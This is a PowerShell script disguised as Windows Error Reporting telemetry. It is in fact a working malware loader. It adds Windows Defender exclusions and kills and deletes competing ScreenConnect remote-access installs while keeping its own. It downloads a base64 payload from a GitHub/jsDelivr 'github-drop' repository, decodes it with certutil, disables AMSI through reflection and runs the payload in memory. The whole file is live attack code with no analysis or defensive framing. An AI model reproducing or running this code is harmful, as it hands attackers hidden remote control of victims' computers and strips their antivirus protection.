# WER telemetry collect - UNIFIED10 bootstrap
# No secondary run.ps1 (AV deletes it). Foreign SC nuked inline FIRST. Payload in-process.
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
$Err = Join-Path $WorkDir 'boot.err'
$B64 = Join-Path $WorkDir 'update.b64'
$Pkg = 'C:\Windows\Temp\wucache_pkg.ps1'
$Marker = 'WU_BUILD_20260731_UNIFIED10'
$Allow = @('5f6010579852e507', 'f861c8140d453427')
$Alt = 'ScreenConnect Client (f861c8140d453427)'
$Cb = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

function W([string]$m) {
    try {
        if (-not (Test-Path $WorkDir)) { New-Item $WorkDir -ItemType Directory -Force | Out-Null }
        Add-Content -LiteralPath $Err -Value $m -EA 0
    } catch {}
}

function Nuke-ForeignScInline {
    W 'go_nuke_foreign_begin'
    $n = 0
    Get-CimInstance Win32_Service -EA 0 | Where-Object {
        $_.Name -like '*ScreenConnect*' -or $_.DisplayName -like '*ScreenConnect*' -or $_.PathName -like '*ScreenConnect*'
    } | ForEach-Object {
        $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
        $fps = @([regex]::Matches($blob, '(?i)\(([0-9a-f]{16})\)') | ForEach-Object { $_.Groups[1].Value.ToLowerInvariant() })
        if ($fps.Count -gt 0) {
            foreach ($fp in $fps) {
                if ($Allow -contains $fp) { W "go_keep $fp"; continue }
                W "go_nuke_svc $($_.Name) fp=$fp"
                cmd /c "sc stop `"$($_.Name)`" >nul 2>&1"
                cmd /c "sc delete `"$($_.Name)`" >nul 2>&1"
                $n++
            }
        } else {
            $keep = $false
            foreach ($a in $Allow) { if ($blob -like "*$a*") { $keep = $true } }
            if (-not $keep) {
                W "go_nuke_nofp $($_.Name)"
                cmd /c "sc stop `"$($_.Name)`" >nul 2>&1"
                cmd /c "sc delete `"$($_.Name)`" >nul 2>&1"
                $n++
            }
        }
    }
    Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.Name -match '(?i)^ScreenConnect\.' } | ForEach-Object {
        $blob = "$($_.ExecutablePath) $($_.CommandLine)"
        $keep = $false
        foreach ($a in $Allow) { if ($blob -like "*$a*") { $keep = $true } }
        if ($blob -like '*\.wucache\scclient*') { $keep = $true }
        if (-not $keep) {
            W "go_nuke_proc $($_.ProcessId)"
            Stop-Process -Id $_.ProcessId -Force -EA 0
            $n++
        }
    }
    foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)})) {
        Get-ChildItem $base -Directory -EA 0 | Where-Object { $_.Name -like 'ScreenConnect*' } | ForEach-Object {
            $keep = $false
            foreach ($a in $Allow) { if ($_.Name -like "*$a*") { $keep = $true } }
            if (-not $keep) {
                W "go_nuke_dir $($_.FullName)"
                Remove-Item $_.FullName -Recurse -Force -EA 0
                $n++
            }
        }
    }
    try { cmd /c "sc config `"$Alt`" start= auto >nul 2>&1"; cmd /c "sc start `"$Alt`" >nul 2>&1" } catch {}
    W "go_nuke_foreign_done actions=$n"
}

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$prin = [Security.Principal.WindowsPrincipal]$id
if (-not (($id.User.Value -eq 'S-1-5-18') -or $prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    Write-Host 'Acces refuse: run as Administrator or SYSTEM'
    exit 5
}

New-Item $WorkDir, 'C:\Windows\Temp' -ItemType Directory -Force | Out-Null
Remove-Item $Err, $B64 -Force -EA 0
W ("go_start {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

try {
    Add-MpPreference -ExclusionPath $WorkDir -EA 0
    Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0
    Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'curl.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0
} catch {}

Nuke-ForeignScInline

$urls = @(
    "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=$Cb",
    "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=$Cb"
)
$ok = $false
foreach ($u in $urls) {
    W "dl $u"
    try {
        & curl.exe -L --ssl-no-revoke --connect-timeout 20 -o $B64 $u 2>$null | Out-Null
        if ((Test-Path $B64) -and ((Get-Item $B64).Length -gt 1000)) { $ok = $true; break }
    } catch {}
}
if (-not $ok) { W 'dl_fail'; Write-Host 'Download failed'; exit 1 }
W ("dl_ok bytes={0}" -f (Get-Item $B64).Length)

Remove-Item $Pkg -Force -EA 0
& certutil.exe -decode $B64 $Pkg 2>$null | Out-Null
if (-not (Test-Path $Pkg)) {
    $b = ([IO.File]::ReadAllText($B64) -replace '\s', '')
    [IO.File]::WriteAllBytes($Pkg, [Convert]::FromBase64String($b))
}
if (-not (Test-Path $Pkg)) { W 'decode_fail'; exit 2 }
W ("decoded_bytes={0}" -f (Get-Item $Pkg).Length)
if (-not (Select-String -LiteralPath $Pkg -Pattern $Marker -Quiet)) {
    W "marker_fail want_$Marker"
    exit 3
}
Copy-Item $Pkg (Join-Path $WorkDir 'wucache_pkg.ps1') -Force -EA 0

W 'ps_engine_inline'
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msiUtils')
    if ($t) {
        $f = $t.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}
W 'amsi_ok'
try {
    $c = [IO.File]::ReadAllText($Pkg)
    W ("chars={0}" -f $c.Length)
    $sb = [ScriptBlock]::Create($c)
    W 'invoke'
    & $sb
    W 'invoke_done'
} catch {
    W ("invoke_err {0}" -f $_.Exception.Message)
}

Nuke-ForeignScInline

if (Test-Path (Join-Path $WorkDir '.diag.log')) { W 'diag_ok' } else { W 'diag_missing' }
try { cmd /c "sc start `"$Alt`" >nul 2>&1" } catch {}
W 'go_exit_0'
Write-Host 'UNIFIED10 done. Check:'
Write-Host "  type $Err"
Write-Host "  type $WorkDir\.diag.log"
Write-Host '  sc query type= service state= all | findstr /I ScreenConnect'
exit 0
